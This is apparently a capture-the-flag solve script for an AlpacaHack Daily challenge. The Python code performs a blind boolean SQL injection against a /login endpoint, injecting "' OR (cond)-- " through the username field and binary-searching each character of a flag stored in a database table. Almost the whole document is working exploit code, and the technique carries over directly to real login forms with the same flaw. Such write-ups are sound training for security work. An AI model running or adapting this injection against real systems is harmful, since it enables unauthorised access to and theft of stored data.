#!/usr/bin/env python3
"""
secret-table-3 — AlpacaHack Daily 2026-07-10

Blind boolean SQLi in /login:
  SELECT * FROM users WHERE username='{u}' AND password='{p}'
Response is "Hello, user!" when a row matches, "invalid credentials" otherwise.
Inject via username:  ' OR (<cond>)--   → if <cond> true, username='' OR TRUE
matches all rows (a row exists → "Hello"), else no row ("invalid").

Extract the flag from the `secret` table char by char, binary-searching the
unicode value of each character.

Usage: python3 solve.py <base_url>   e.g. http://host:port
"""
import sys, re, urllib.request, urllib.parse

BASE = sys.argv[1].rstrip("/")

def oracle(cond: str) -> bool:
    """True iff the SQL condition holds (login returns a row)."""
    username = f"' OR ({cond})-- "
    data = urllib.parse.urlencode({"username": username, "password": "x"}).encode()
    req = urllib.request.Request(BASE + "/login", data=data)
    with urllib.request.urlopen(req, timeout=20) as r:
        body = r.read().decode(errors="replace")
    if "Hello" in body:
        return True
    if "invalid credentials" in body:
        return False
    raise RuntimeError("unexpected response: " + body[:200])

def flag_length() -> int:
    lo, hi = 0, 128
    # find upper bound where length < hi is true
    while not oracle(f"(SELECT length(flag) FROM secret)<{hi}"):
        hi *= 2
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"(SELECT length(flag) FROM secret)<{mid}"):
            hi = mid
        else:
            lo = mid + 1
    return lo  # smallest N with length<N  → length = N-1? no: length < lo true, length < lo-1 false → length = lo-1

def char_at(i: int) -> int:
    lo, hi = 1, 128  # printable range
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"(SELECT unicode(substr(flag,{i},1)) FROM secret)<{mid}"):
            hi = mid
        else:
            lo = mid + 1
    return lo - 1  # smallest N with unicode<N → char value = N-1

def main():
    n = flag_length() - 1
    flag = ""
    for i in range(1, n + 1):
        c = char_at(i)
        flag += chr(c)
        sys.stderr.write(flag + "\n")
    print(flag)

if __name__ == "__main__":
    main()
